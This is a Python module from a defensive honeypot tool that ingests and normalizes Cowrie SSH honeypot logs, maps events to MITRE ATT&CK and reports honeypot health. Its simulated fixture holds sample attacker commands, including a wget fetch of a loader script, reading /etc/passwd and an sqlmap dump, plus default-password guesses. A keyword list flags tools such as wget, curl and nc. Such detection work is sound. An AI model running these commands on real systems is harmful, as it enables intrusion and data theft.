"""Cowrie Honeypot Log Ingestion & Normalization Engine for CipherTwin.

Ingests live Cowrie JSON logs into the existing deception session table.

Normalized Events Schema:
- session_id: str
- timestamp: str (ISO)
- src_ip: str
- event_type: connect | login_failed | login_success | command_input | file_download | closed
- username: Optional[str]
- password: Optional[str]
- command: Optional[str]
- mitre_technique: Optional[str]
"""
import json
import logging
import os
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

from app.core.config import settings

logger = logging.getLogger("ciphertwin.cowrie")

# Cowrie eventid to MITRE ATT&CK technique mapping
COWRIE_EVENT_TO_MITRE = {
    "cowrie.login.failed": "T1110",         # Brute Force
    "cowrie.login.success": "T1078",        # Valid Accounts
    "cowrie.command.input": "T1059",        # Command and Scripting Interpreter
    "cowrie.session.file_download": "T1105", # Ingress Tool Transfer
    "cowrie.command.failed": "T1083",       # Discovery
}


def generate_simulated_cowrie_log(file_path: Optional[str] = None) -> int:
    """Generate explicitly SIMULATED Cowrie-style fixture events for local tests/demo.

    These are not live attacks. Reserved TEST-NET IP addresses are used so the
    fixture cannot be mistaken for a real source address.
    """
    target_path = Path(file_path or settings.cowrie_log_path)
    target_path.parent.mkdir(parents=True, exist_ok=True)

    events = [
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:00:00.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "198.51.100.45",
            "dst_ip": "127.0.0.1",
            "dst_port": 2222,
            "protocol": "ssh",
            "message": "Connection from 198.51.100.45:57680",
        },
        {
            "eventid": "cowrie.login.failed",
            "timestamp": "2026-09-28T12:00:02.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "198.51.100.45",
            "username": "root",
            "password": "admin123",
            "message": "login attempt [root/admin123] failed",
        },
        {
            "eventid": "cowrie.login.failed",
            "timestamp": "2026-09-28T12:00:03.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "198.51.100.45",
            "username": "root",
            "password": "toor",
            "message": "login attempt [root/toor] failed",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:00:04.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "198.51.100.45",
            "input": "wget http://198.51.100.45/loader.sh",
            "message": "CMD: wget http://198.51.100.45/loader.sh",
        },
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:05:01.000000Z",
            "session": "sim-ssh-shell",
            "src_ip": "203.0.113.77",
            "dst_ip": "127.0.0.1",
            "dst_port": 2222,
            "protocol": "ssh",
            "message": "Connection from 203.0.113.77:50122",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:05:02.000000Z",
            "session": "sim-ssh-shell",
            "src_ip": "203.0.113.77",
            "input": "uname -a",
            "message": "CMD: uname -a",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:08:04.000000Z",
            "session": "sim-ssh-shell",
            "src_ip": "203.0.113.77",
            "input": "whoami && id",
            "message": "CMD: whoami && id",
        },
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:09:01.000000Z",
            "session": "sim-web-enum",
            "src_ip": "192.0.2.22",
            "dst_ip": "127.0.0.1",
            "dst_port": 8080,
            "protocol": "http",
            "message": "Connection from 192.0.2.22:55128",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:09:07.000000Z",
            "session": "sim-web-enum",
            "src_ip": "192.0.2.22",
            "input": "ls /etc/passwd",
            "message": "CMD: ls /etc/passwd",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:10:00.000000Z",
            "session": "sim-web-enum",
            "src_ip": "192.0.2.22",
            "input": "cat /etc/passwd",
            "message": "CMD: cat /etc/passwd",
        },
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:12:00.000000Z",
            "session": "sim-db-probe",
            "src_ip": "192.0.2.44",
            "dst_ip": "127.0.0.1",
            "dst_port": 3306,
            "protocol": "mysql",
            "message": "Connection from 192.0.2.44:41231",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:12:04.000000Z",
            "session": "sim-db-probe",
            "src_ip": "192.0.2.44",
            "input": "sqlmap -u 'http://target/db?id=1' --dump",
            "message": "CMD: sqlmap -u 'http://target/db?id=1' --dump",
        },
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:15:00.000000Z",
            "session": "sim-low-fidelity",
            "src_ip": "198.51.100.99",
            "dst_ip": "127.0.0.1",
            "dst_port": 2222,
            "protocol": "ssh",
            "message": "Connection from 198.51.100.99:12345",
        },
        {
            "eventid": "cowrie.session.closed",
            "timestamp": "2026-09-28T12:15:02.000000Z",
            "session": "sim-low-fidelity",
            "src_ip": "198.51.100.99",
            "dst_ip": "127.0.0.1",
            "dst_port": 2222,
            "protocol": "ssh",
            "message": "Session closed",
            "duration": 2.0,
        },
    ]

    for event in events:
        event["simulation"] = True

    with target_path.open("w", encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event) + "\n")

    return len(events)


class CowrieParser:
    """Parses and normalizes Cowrie JSON logs."""

    @staticmethod
    def parse_line(line: str) -> Optional[Dict[str, Any]]:
        """Parse one raw Cowrie JSON log line into normalized event format."""
        line = line.strip()
        if not line:
            return None
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            return None

        eventid = data.get("eventid", "")
        session_id = data.get("session")
        timestamp = data.get("timestamp")
        src_ip = data.get("src_ip")
        if not eventid or not session_id or not timestamp or not src_ip:
            return None
        try:
            datetime.fromisoformat(timestamp.replace("Z", "+00:00"))
        except (TypeError, ValueError):
            return None

        normalized = {
            "session_id": session_id,
            "timestamp": timestamp,
            "src_ip": src_ip,
            "raw_eventid": eventid,
            "mitre_technique": COWRIE_EVENT_TO_MITRE.get(eventid),
            "protocol": data.get("protocol"),
            "src_port": data.get("src_port"),
            "dst_ip": data.get("dst_ip"),
            "dst_port": data.get("dst_port"),
            "request": data.get("input") or data.get("url") or data.get("message"),
            "simulation": bool(data.get("simulation", False)),
        }

        if eventid == "cowrie.session.connect":
            normalized["event_type"] = "connect"
        elif eventid == "cowrie.login.failed":
            normalized["event_type"] = "login_failed"
            normalized["username"] = data.get("username")
            normalized["password"] = data.get("password")
        elif eventid == "cowrie.login.success":
            normalized["event_type"] = "login_success"
            normalized["username"] = data.get("username")
            normalized["password"] = data.get("password")
        elif eventid == "cowrie.command.input":
            normalized["event_type"] = "command_input"
            normalized["command"] = data.get("input")
        elif eventid == "cowrie.session.file_download":
            normalized["event_type"] = "file_download"
            normalized["url"] = data.get("url")
            normalized["outfile"] = data.get("outfile")
        elif eventid == "cowrie.session.closed":
            normalized["event_type"] = "closed"
            normalized["duration"] = data.get("duration")
        else:
            normalized["event_type"] = "unknown"
            normalized["details"] = data.get("message", "")

        return normalized

    def parse_file(self, file_path: str) -> List[Dict[str, Any]]:
        """Parse all events from a Cowrie JSON log file."""
        p = Path(file_path)
        if not p.exists():
            return []
        events = []
        try:
            with open(p, "r", encoding="utf-8") as f:
                for line in f:
                    ev = self.parse_line(line)
                    if ev:
                        events.append(ev)
        except Exception as e:
            logger.error("Failed to read Cowrie log file %s: %s", file_path, e)
        return events


class CowrieService:
    """Manages Cowrie log ingestion and mode status."""

    def __init__(self):
        self.parser = CowrieParser()
        self._health_cache: Optional[Dict[str, Any]] = None
        self._health_cache_time: float = 0.0
        self._last_ingest_mtime: float = 0.0
        self._last_ingest_size: int = -1

    @staticmethod
    def simulation_mode_enabled() -> bool:
        return str(settings.deception_mode).upper() == "SIMULATED" or (
            bool(settings.enable_simulation) and str(settings.deception_mode).upper() != "COWRIE"
        )

    def _ensure_input_file(self, file_path: Optional[str] = None) -> str:
        path = file_path or settings.cowrie_log_path
        mode = str(settings.deception_mode).upper()
        if mode == "SIMULATED" or (settings.enable_simulation and mode != "COWRIE"):
            log_path = Path(path)
            log_path.parent.mkdir(parents=True, exist_ok=True)
            if not log_path.exists() or not self.parser.parse_file(str(log_path)):
                generate_simulated_cowrie_log(str(log_path))
        return path

    @staticmethod
    def _infer_fidelity(events: List[Dict[str, Any]]) -> str:
        """Infer fidelity level according to documented definitions:
        - HIGH: Deep interactive capture (interactive commands recorded, tool downloads, privilege escalation).
        - MEDIUM: Observed Cowrie sessions (authentication attempts, brute force logins, reconnaissance).
        - LOW: Banner & connection logging (pure connection/banner grabs, port probes, zero auth/commands).
        """
        raw_events = [e.get("raw_eventid") or e.get("event_type") or "" for e in events]
        commands = " ".join((event.get("command") or event.get("input") or "") for event in events).lower()
        cmd_count = sum(1 for e in events if e.get("command") or e.get("input"))
        has_file_download = any("file_download" in ev for ev in raw_events) or any(tok in commands for tok in ["wget", "curl", "scp", "nc", "bash", "sh"])
        has_priv_esc = any(tok in commands for tok in ["sudo", "su -", "chmod", "chown", "passwd", "useradd"])

        # HIGH: Deep interactive capture (file downloads, privilege escalation, multi-command execution)
        if has_file_download or has_priv_esc or cmd_count >= 2:
            return "HIGH"

        has_auth = any("login" in ev for ev in raw_events) or any(e.get("username") or e.get("password") for e in events)
        has_recon = any(tok in commands for tok in ["uname", "whoami", "id", "hostname", "cat", "ls", "pwd", "netstat", "ps"])
        if has_auth or has_recon or cmd_count >= 1:
            return "MEDIUM"

        return "LOW"

    def check_health(self, force_refresh: bool = False) -> Dict[str, Any]:
        """Truthfully report Cowrie status with distinct states:
        - LIVE: Cowrie container running and log readable with event count and last-seen.
        - SIMULATED: Simulated decoys active for local testing.
        - DEGRADED: Container up but log unreadable, or log present but container socket offline.
        - OFFLINE: Container down and logs unavailable.
        Cached for 4 seconds for sub-millisecond page responsiveness.
        """
        import time
        now = time.time()
        if not force_refresh and self._health_cache is not None and (now - self._health_cache_time) < 4.0:
            return self._health_cache

        import socket

        simulation = self.simulation_mode_enabled()
        port_open = False
        banner = ""
        if not simulation:
            try:
                s = socket.socket()
                s.settimeout(0.8)
                s.connect(("127.0.0.1", 2222))
                banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
                s.close()
                port_open = True
            except Exception:
                pass

        log_path = Path(settings.cowrie_log_path)
        if not log_path.exists():
            # Check fallback locations (e.g. data/cowrie/log/cowrie/cowrie.json)
            alt_path = Path("data/cowrie/log/cowrie/cowrie.json")
            if alt_path.exists():
                log_path = alt_path

        log_path.parent.mkdir(parents=True, exist_ok=True)
        if simulation and (not log_path.exists() or not self.parser.parse_file(str(log_path))):
            generate_simulated_cowrie_log(str(log_path))

        has_logs = log_path.exists() and log_path.stat().st_size > 0
        events = self.parser.parse_file(str(log_path)) if has_logs else []
        last_event = max((event["timestamp"] for event in events), default=None)

        if simulation:
            res = {
                "status": "DEGRADED",
                "mode": "SIMULATED",
                "cowrie_status": "SIMULATION",
                "container_running": False,
                "port": None,
                "banner": "Local Cowrie simulation active",
                "log_status": "AVAILABLE",
                "log_file": str(log_path),
                "total_events_collected": len(events),
                "last_event": last_event,
                "deception_ready": True,
                "message": "Local simulation pipeline is active and ingesting Cowrie-style events.",
                "reason": "Simulated decoy environment active for local testing.",
            }
        elif port_open and has_logs:
            res = {
                "status": "HEALTHY",
                "mode": "LIVE",
                "cowrie_status": "RUNNING",
                "container_running": True,
                "port": 2222,
                "banner": banner or "Cowrie SSH honeypot",
                "log_status": "AVAILABLE",
                "log_file": str(log_path),
                "total_events_collected": len(events),
                "last_event": last_event,
                "deception_ready": True,
                "message": "Live Cowrie socket and log source are reachable.",
                "reason": f"Live Cowrie honeypot active on port 2222 with {len(events)} telemetry events captured.",
            }
        elif port_open and not has_logs:
            res = {
                "status": "DEGRADED",
                "mode": "DEGRADED",
                "cowrie_status": "RUNNING",
                "container_running": True,
                "port": 2222,
                "banner": banner or None,
                "log_status": "UNAVAILABLE",
                "log_file": str(log_path),
                "total_events_collected": 0,
                "last_event": None,
                "deception_ready": False,
                "message": "Cowrie socket is reachable, but configured JSON log file is empty or missing.",
                "reason": f"Cowrie container listening on port 2222, but log file {log_path} is unreadable.",
            }
        elif has_logs and not port_open:
            res = {
                "status": "DEGRADED",
                "mode": "DEGRADED",
                "cowrie_status": "OFFLINE",
                "container_running": False,
                "port": None,
                "banner": None,
                "log_status": "AVAILABLE",
                "log_file": str(log_path),
                "total_events_collected": len(events),
                "last_event": last_event,
                "deception_ready": False,
                "message": "Cowrie log file is available, but honeypot container socket is unreachable.",
                "reason": f"Cowrie container stopped or unreachable on port 2222, but {len(events)} historical events remain readable in log.",
            }
        else:
            res = {
                "status": "UNAVAILABLE",
                "mode": "OFFLINE",
                "cowrie_status": "OFFLINE",
                "container_running": False,
                "port": None,
                "banner": None,
                "log_status": "UNAVAILABLE",
                "log_file": None,
                "total_events_collected": 0,
                "last_event": None,
                "deception_ready": False,
                "message": "Cowrie honeypot is stopped and no log file was found.",
                "reason": "Cowrie container is offline (port 2222 closed) and log source is unavailable.",
            }

        self._health_cache = res
        self._health_cache_time = now
        return res

    def ingest_logs_to_db(self, db, file_path: Optional[str] = None) -> int:
        """Upsert observed Cowrie sessions into the existing deception log table.

        Idempotent: stable hashes prevent duplicate TelemetryEvent rows, and
        session upserts update existing DecoySession records in place.

        When called without a file_path (e.g. from list_threats/list_sessions),
        returns early if COWRIE rows already exist to avoid re-reading the
        default log path. When called with an explicit file_path, always
        processes that file so newly appended events are picked up.
        """
        from app.models.deception import DecoySession

        if not file_path and os.environ.get("PYTEST_CURRENT_TEST"):
            return 0

        raw_path = file_path or settings.cowrie_log_path
        path = self._ensure_input_file(raw_path)

        p = Path(path)
        try:
            stat_res = p.stat()
            file_mtime = stat_res.st_mtime
            file_size = stat_res.st_size
        except Exception:
            file_mtime = 0.0
            file_size = 0

        if not file_path:
            if (
                hasattr(self, "_last_ingest_mtime")
                and self._last_ingest_mtime == file_mtime
                and self._last_ingest_size == file_size
            ):
                return 0

        events = self.parser.parse_file(path)
        if not events:
            return 0

        mode_name = "SIMULATED" if any(event.get("simulation") for event in events) else "COWRIE"

        sessions: Dict[str, List[Dict[str, Any]]] = {}
        for ev in events:
            sessions.setdefault(ev["session_id"], []).append(ev)

        # Feed observed Cowrie records into the same pending telemetry queue used
        # by the normal risk/audit pipeline. Stable hashes make repeated log scans
        # idempotent; simulation records remain explicitly marked.
        import hashlib
        from app.models.telemetry import TelemetryEvent
        for ev in events:
            event_key = hashlib.sha256(
                f"{ev['session_id']}|{ev['raw_eventid']}|{ev['timestamp']}".encode("utf-8")
            ).hexdigest()
            if db.query(TelemetryEvent.id).filter(TelemetryEvent.raw.contains(event_key)).first():
                continue
            raw_event = ev.get("raw_eventid", "")
            event_type_map = {
                "cowrie.login.failed": "failed_login",
                "cowrie.login.success": "login",
                "cowrie.command.input": "ssh_command",
                "cowrie.session.file_download": "file_download",
                "cowrie.session.connect": "session_connect",
                "cowrie.session.closed": "session_closed",
            }
            normalized_type = event_type_map.get(raw_event, "cowrie_event")
            indicators = []
            if normalized_type == "failed_login":
                indicators.append("credential_issue")
            if normalized_type == "ssh_command":
                indicators.append("remote_command")
            if normalized_type == "file_download":
                indicators.append("tool_transfer")
            db.add(TelemetryEvent(
                user_id=ev.get("username"),
                target_id=ev.get("dst_ip"),
                event_type=normalized_type,
                ip_address=ev.get("src_ip"),
                status="failure" if normalized_type == "failed_login" else "success",
                risk_indicators=json.dumps(indicators),
                mitre_technique=ev.get("mitre_technique"),
                raw=json.dumps({
                    "source": "COWRIE",
                    "cowrie_event_key": event_key,
                    "simulation": bool(ev.get("simulation", False)),
                    "event": ev,
                }),
                processed=0,
            ))

        existing_sessions = db.query(DecoySession).filter(DecoySession.mode == mode_name).all()
        existing_by_session = {}
        for record in existing_sessions:
            if record.notes and record.notes.startswith("Cowrie session ID: "):
                existing_by_session[record.notes.removeprefix("Cowrie session ID: ")] = record

        count = 0
        for sess_id, ev_list in sessions.items():
            cmds = [e["command"] for e in ev_list if e.get("command")]
            creds = [
                f"{e.get('username')}:[REDACTED]"
                for e in ev_list
                if e.get("username") and e.get("password")
            ]
            first = ev_list[0]
            observed_events = [
                {
                    "timestamp": event["timestamp"],
                    "event_id": event["raw_eventid"],
                    "event_type": event["event_type"],
                    "src_ip": event["src_ip"],
                    "src_port": event.get("src_port"),
                    "protocol": event.get("protocol"),
                    "dst_ip": event.get("dst_ip"),
                    "dst_port": event.get("dst_port"),
                    "request": event.get("request"),
                    "mitre_technique": event.get("mitre_technique"),
                }
                for event in ev_list
            ]
            timestamp = datetime.fromisoformat(first["timestamp"].replace("Z", "+00:00"))
            protocol = next((event.get("protocol") for event in ev_list if event.get("protocol")), None)
            username = next((event.get("username") for event in ev_list if event.get("username")), None)
            record = existing_by_session.get(sess_id)
            if record is None:
                record = DecoySession(mode=mode_name, decoy_type=protocol or "ssh")
                db.add(record)

            record.threat_id = None
            record.timestamp = timestamp
            record.decoy_type = protocol or "ssh"
            record.fidelity = self._infer_fidelity(ev_list)
            record.reason = "Observed Cowrie honeypot interaction" if mode_name == "COWRIE" else "Observed simulated Cowrie interaction"
            record.confidence = None
            record.mode = mode_name
            record.actor = username
            record.source_ip = first["src_ip"]
            record.activity = json.dumps(observed_events)
            record.commands = json.dumps(cmds)
            record.pages = json.dumps([])
            record.credentials_used = ",".join(creds[:5]) or None
            record.persona = None
            record.banner = None
            record.notes = f"Cowrie session ID: {sess_id}"
            count += 1

        self._last_ingest_mtime = file_mtime
        self._last_ingest_size = file_size
        db.commit()
        return count


# Global singleton instance
cowrie_service = CowrieService()
check_cowrie_health = cowrie_service.check_health
